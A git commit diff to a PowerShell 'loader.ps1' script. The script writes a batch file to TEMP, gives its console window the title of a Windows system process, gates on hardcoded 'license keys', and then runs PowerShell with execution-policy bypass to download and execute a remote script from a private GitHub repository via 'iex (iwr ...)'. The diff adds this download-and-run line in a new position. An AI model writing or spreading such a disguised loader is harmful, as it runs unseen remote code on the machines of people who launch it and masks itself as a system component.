2d615d13a4a7d3811fe90c629cdf3241b8c45f35
lnwmon2-crypto <lnwmon2@gmail.com>
2026-03-28 17:23:42 +0700

    Update loader.ps1

--- loader.ps1
+++ loader.ps1
@@ -1,4 +1,6 @@
-$cmd = @"
+$path = "$env:TEMP\run.bat"
+
+@"
 @echo off
 title C:\Windows\System32\conhost.exe
 cls
@@ -9,34 +11,20 @@ start notepad "%hist%"
 
 set /p key=Enter license key: 
 
-set valid=0
+if "%key%"=="Nel" goto ok
+if "%key%"=="King" goto ok
+if "%key%"=="finalpremium-27BHJ" goto ok
 
-if "%key%"=="finalpremium-27BHJ" set valid=1
-if "%key%"=="finalpremium-8K2LM" set valid=1
-if "%key%"=="finalpremium-X91QP" set valid=1
-if "%key%"=="finalpremium-55TGH" set valid=1
-if "%key%"=="finalpremium-AB12Z" set valid=1
-if "%key%"=="finalpremium-9PLK3" set valid=1
-if "%key%"=="finalpremium-QW77E" set valid=1
-if "%key%"=="finalpremium-ZX90N" set valid=1
-if "%key%"=="finalpremium-MN45R" set valid=1
-if "%key%"=="finalpremium-LL22X" set valid=1
-if "%key%"=="Nel" set valid=1
-if "%key%"=="King" set valid=1
-
-if "%valid%"=="1" (
-    powershell -ExecutionPolicy Bypass -Command "iex (iwr 'https://raw.githubusercontent.com/lnwmon2-crypto/private/main/main.ps1')"
-    echo.
-    echo Successfully
-) else (
-    echo Invalid key
-)
-
+echo Invalid key
 pause
-"@
+exit
 
-$path = "$env:TEMP\run.bat"
-$cmd | Out-File -Encoding ASCII $path
+:ok
+powershell -ExecutionPolicy Bypass -Command "iex (iwr 'https://raw.githubusercontent.com/lnwmon2-crypto/private/main/main.ps1')"
+echo.
+echo Successfully
+pause
+"@ | Out-File -Encoding ASCII $path
 
 Start-Process cmd -ArgumentList "/k "$path""
 exit
